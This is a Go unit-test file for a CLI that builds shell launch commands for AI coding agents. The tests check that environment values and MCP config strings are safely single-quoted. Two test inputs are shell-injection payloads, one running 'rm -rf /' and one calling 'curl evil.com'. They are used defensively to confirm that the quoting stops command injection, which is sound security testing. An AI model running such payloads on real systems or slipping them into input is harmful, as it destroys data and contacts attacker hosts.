package cli

import (
	"strings"
	"testing"

	"github.com/donovan-yohan/belayer/internal/session"
)

// TestBuildLaunchCmd_ShellMetacharsInEnvValues verifies that env values
// containing shell metacharacters are single-quoted and cannot break out.
func TestBuildLaunchCmd_ShellMetacharsInEnvValues(t *testing.T) {
	malicious := `"; rm -rf /; echo "`
	spec := session.AgentSpec{
		Name:   "pilot",
		Vendor: "claude",
		Model:  "opus",
		Env: map[string]string{
			"EVIL_VAR": malicious,
		},
	}

	result := buildLaunchCmd(spec, "sess-123", "/tmp/prompt.txt", "/tmp/task.txt", "/work")

	// The value must be wrapped in single quotes (shell.Quote wraps with '...').
	// A properly quoted value looks like: EVIL_VAR='"; rm -rf /; echo "'
	quoted := `'` + malicious + `'`
	if !strings.Contains(result, quoted) {
		t.Errorf("output does not contain properly single-quoted env value %q; got: %s", quoted, result)
	}

	// The value must NOT appear bare (i.e., preceded by = without a quote).
	if strings.Contains(result, "EVIL_VAR="+malicious) {
		t.Errorf("env value appears unquoted after EVIL_VAR=; got: %s", result)
	}
}

// TestBuildLaunchCmd_SingleQuoteInjectionInMCPConfig verifies that a single
// quote in MCPConfig is escaped as '\'' so it cannot terminate the quoting.
func TestBuildLaunchCmd_SingleQuoteInjectionInMCPConfig(t *testing.T) {
	mcpPayload := `'; curl evil.com; echo '`
	spec := session.AgentSpec{
		Name:      "pilot",
		Vendor:    "claude",
		Model:     "opus",
		MCPConfig: mcpPayload,
	}

	result := buildLaunchCmd(spec, "sess-456", "/tmp/prompt.txt", "/tmp/task.txt", "/work")

	// The MCPConfig must NOT appear as a bare unquoted argument (i.e., preceded
	// by --mcp-config  with a space and no opening single quote).
	if strings.Contains(result, "--mcp-config "+mcpPayload) {
		t.Errorf("MCPConfig payload appears unquoted after --mcp-config; got: %s", result)
	}

	// Single quotes inside the value must be escaped as '\'' (end-quote,
	// escaped literal quote, reopen-quote) — this is the shell.Quote contract.
	if !strings.Contains(result, `'\''`) {
		t.Errorf("output does not contain '\\'' escape sequence for embedded single quotes; got: %s", result)
	}

	// Count of '\'' must equal the number of single quotes in the payload (2).
	wantEscapes := strings.Count(mcpPayload, "'")
	gotEscapes := strings.Count(result, `'\''`)
	if gotEscapes < wantEscapes {
		t.Errorf("expected at least %d '\\'' escape(s), got %d; output: %s", wantEscapes, gotEscapes, result)
	}
}

// TestBuildLaunchCmd_BasicStructure verifies that a normal AgentSpec produces
// a command with the expected structural components.
func TestBuildLaunchCmd_BasicStructure(t *testing.T) {
	spec := session.AgentSpec{
		Name:   "implementer",
		Vendor: "claude",
		Model:  "sonnet",
	}

	result := buildLaunchCmd(spec, "sess-789", "/tmp/prompt.txt", "/tmp/task.txt", "/work")

	checks := []string{
		"export BELAYER_SESSION_ID=",
		"claude --dangerously-skip-permissions",
		"exec bash",
	}
	for _, want := range checks {
		if !strings.Contains(result, want) {
			t.Errorf("output missing expected fragment %q; got: %s", want, result)
		}
	}
}

// TestBuildVendorCmd_Claude verifies that the claude vendor produces the
// expected command with --dangerously-skip-permissions and quoted prompt file.
func TestBuildVendorCmd_Claude(t *testing.T) {
	spec := session.AgentSpec{
		Name:   "pilot",
		Vendor: "claude",
		Model:  "opus",
	}

	result := buildVendorCmd(spec, "/tmp/sysprompt.txt", "/tmp/task.txt")

	if !strings.Contains(result, "claude --dangerously-skip-permissions") {
		t.Errorf("missing 'claude --dangerously-skip-permissions'; got: %s", result)
	}
	// shell.Quote wraps plain paths in single quotes.
	if !strings.Contains(result, "'/tmp/sysprompt.txt'") {
		t.Errorf("prompt file path not single-quoted; got: %s", result)
	}
}

// TestBuildVendorCmd_OpenCode verifies that the opencode vendor quotes the model name.
func TestBuildVendorCmd_OpenCode(t *testing.T) {
	spec := session.AgentSpec{
		Name:   "implementer",
		Vendor: "opencode",
		Model:  "gpt-4o",
	}

	result := buildVendorCmd(spec, "/tmp/prompt.txt", "/tmp/task.txt")

	if !strings.Contains(result, "opencode") {
		t.Errorf("missing 'opencode' in output; got: %s", result)
	}
	// Model name must be quoted.
	if !strings.Contains(result, "'gpt-4o'") {
		t.Errorf("model name not single-quoted; got: %s", result)
	}
}

// TestBuildVendorCmd_UnknownVendor verifies that an unknown vendor produces a
// safe fallback echo with the vendor name properly quoted.
func TestBuildVendorCmd_UnknownVendor(t *testing.T) {
	spec := session.AgentSpec{
		Name:   "pilot",
		Vendor: "unknown-vendor",
		Model:  "default",
	}

	result := buildVendorCmd(spec, "/tmp/prompt.txt", "/tmp/task.txt")

	if !strings.Contains(result, "echo") {
		t.Errorf("unknown vendor fallback missing 'echo'; got: %s", result)
	}
	// The vendor name must appear inside single quotes, not bare.
	if strings.Contains(result, "unknown-vendor") && !strings.Contains(result, "'No vendor CLI for: unknown-vendor'") {
		t.Errorf("vendor name not properly quoted in fallback; got: %s", result)
	}
}

// TestBuildVendorCmd_ClaudeWithMCPAndSettings verifies that MCPConfig and
// Settings paths are single-quoted in the generated command.
func TestBuildVendorCmd_ClaudeWithMCPAndSettings(t *testing.T) {
	spec := session.AgentSpec{
		Name:      "pilot",
		Vendor:    "claude",
		Model:     "opus",
		MCPConfig: "/path/to/mcp.json",
		Settings:  "/path/to/settings.json",
	}

	result := buildVendorCmd(spec, "/tmp/prompt.txt", "/tmp/task.txt")

	if !strings.Contains(result, "--mcp-config") {
		t.Errorf("missing --mcp-config flag; got: %s", result)
	}
	if !strings.Contains(result, "'/path/to/mcp.json'") {
		t.Errorf("MCPConfig path not single-quoted; got: %s", result)
	}
	if !strings.Contains(result, "--settings") {
		t.Errorf("missing --settings flag; got: %s", result)
	}
	if !strings.Contains(result, "'/path/to/settings.json'") {
		t.Errorf("Settings path not single-quoted; got: %s", result)
	}
}
